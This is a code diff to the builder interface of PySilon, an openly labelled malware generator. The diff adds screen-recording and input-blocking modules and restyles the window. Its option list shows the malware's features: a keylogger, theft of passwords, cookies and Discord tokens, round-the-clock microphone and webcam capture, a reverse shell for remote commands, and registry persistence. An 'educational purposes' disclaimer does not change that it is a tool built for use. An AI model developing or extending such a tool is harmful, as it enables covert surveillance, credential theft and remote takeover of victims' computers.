@@ -23,7 +23,9 @@ filenames = {
     'mc_recc': 'microphone_recording.py',
     'process': 'process.py',
     'rev_shl': 'reverse_shell.py',
-    'webcam_': 'webcam.py'
+    'webcam_': 'webcam.py',
+    'scrnrec': 'screenrec.py',
+    'inputbl': 'block_input.py'
 }
 
 default_modules = [
@@ -79,6 +81,8 @@ def load_configuration(is_custom):
     cbvar_processes.set(config['FUNCTIONALITY']['process'])
     cbvar_reverse_shell.set(config['FUNCTIONALITY']['rev_shl'])
     cbvar_webcam.set(config['FUNCTIONALITY']['webcam_'])
+    cbvar_scrnrec.set(config['FUNCTIONALITY']['scrnrec'])
+    cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
 
 def reset_configuration():
     server_id.delete(0, END)
@@ -102,6 +106,8 @@ def reset_configuration():
     cbvar_processes.set(True)
     cbvar_reverse_shell.set(True)
     cbvar_webcam.set(True)
+    cbvar_scrnrec.set(True)
+    cbvar_inputbl.set(True)
     cbvar_disclaimer.set(False)
 
     change_icon('resources/icons/icon.ico')
@@ -141,6 +147,8 @@ def save_configuration():
     config['FUNCTIONALITY']['process'] = str(cbvar_processes.get())
     config['FUNCTIONALITY']['rev_shl'] = str(cbvar_reverse_shell.get())
     config['FUNCTIONALITY']['webcam_'] = str(cbvar_webcam.get())
+    config['FUNCTIONALITY']['scrnrec'] = str(cbvar_scrnrec.get())
+    config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -256,10 +264,12 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('700x600')
+    root.geometry('700x620')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
     root.title('PySilon builder')
+    root.configure(bg='#0A0A10')
+    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
 
     my_canvas = Canvas(root, width=1, height=1, bd=0)
     Button(my_canvas, text='Load configuration', command=lambda:load_configuration(False)).grid(row=1, column=1, padx=(10, 0), pady=10)
@@ -275,7 +285,7 @@ else:
     Label(settings_canvas, text='Emergency Token 1:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Emergency Token 2:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='Directory Name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Folder Name*:', justify=RIGHT, anchor=E).grid(row=8, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Executable name*:', justify=RIGHT, anchor=E).grid(row=9, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Icon*:', justify=RIGHT, anchor=E).grid(row=10, padx=(30, 5), pady=2, sticky=E)
     
@@ -329,20 +339,24 @@ else:
     cbvar_processes = BooleanVar(value=True)
     cbvar_reverse_shell = BooleanVar(value=True)
     cbvar_webcam = BooleanVar(value=True)
+    cbvar_scrnrec = BooleanVar(value=True)
+    cbvar_inputbl = BooleanVar(value=True)
 
-    cb_keylogger = Checkbutton(settings_canvas, text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
-    cb_screenshot = Checkbutton(settings_canvas, text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
-    cb_registry = Checkbutton(settings_canvas, text='registry injection (start malware every reboot)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
-    cb_file_downloading = Checkbutton(settings_canvas, text='file downloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
-    cb_file_uploading = Checkbutton(settings_canvas, text='file uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
-    cb_file_removal = Checkbutton(settings_canvas, text='file removal', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
-    cb_file_explorer = Checkbutton(settings_canvas, text='file exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
-    cb_grabber = Checkbutton(settings_canvas, text='grabber (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
-    cb_live_microphone = Checkbutton(settings_canvas, text='live microphone (BOT joins voice-channel and plays live mic input)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
-    cb_microphone_recording = Checkbutton(settings_canvas, text='24/7 microphone recording (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
-    cb_processes = Checkbutton(settings_canvas, text='processes (show list of running processes, kill them)', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
-    cb_reverse_shell = Checkbutton(settings_canvas, text='reverse shell (execute remote CMD commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
-    cb_webcam = Checkbutton(settings_canvas, text='webcam images capturing', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
+    cb_keylogger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
+    cb_screenshot = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
+    cb_registry = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='registry injection (start malware every reboot)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
+    cb_file_downloading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file downloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
+    cb_file_uploading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
+    cb_file_removal = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file removal', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
+    cb_file_explorer = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
+    cb_grabber = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='grabber (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
+    cb_live_microphone = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='live microphone (BOT joins voice-channel and plays live mic input)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
+    cb_microphone_recording = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='24/7 microphone recording (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
+    cb_processes = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='processes (show list of running processes, kill them)', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
+    cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='reverse shell (execute remote CMD commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
+    cb_webcam = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='webcam images capturing', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
+    cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
+    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block inputs (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
     cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
@@ -354,13 +368,15 @@ else:
     cb_grabber.grid(row=10, column=2, sticky=W, padx=(30, 0))
     cb_live_microphone.grid(row=11, column=2, sticky=W, padx=(30, 0))
     cb_microphone_recording.grid(row=12, column=2, sticky=W, padx=(30, 0))
+    cb_scrnrec.grid(row=13, column=2, sticky=W, padx=(30, 0))
     cb_processes.grid(row=14, column=2, sticky=W, padx=(30, 0))
     cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
-    cb_webcam.grid(row=16, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
+    cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
+    cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
-    cb_disclaimer = Checkbutton(bottom_buttons, text='  I\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\'m doing at\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
+    cb_disclaimer = Checkbutton(bottom_buttons, selectcolor='#0A0A10', text='  I\'m aware that this malware has been made for educational purposes only, and the creator is no way responsible\n  for any direct or indirect damage caused due to the misusage of the information. Everything I do, I\'m doing at\n  my own risk and responsibility.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
     cb_disclaimer.grid(row=1)
     bottom_buttons.pack(pady=(20, 0))
 
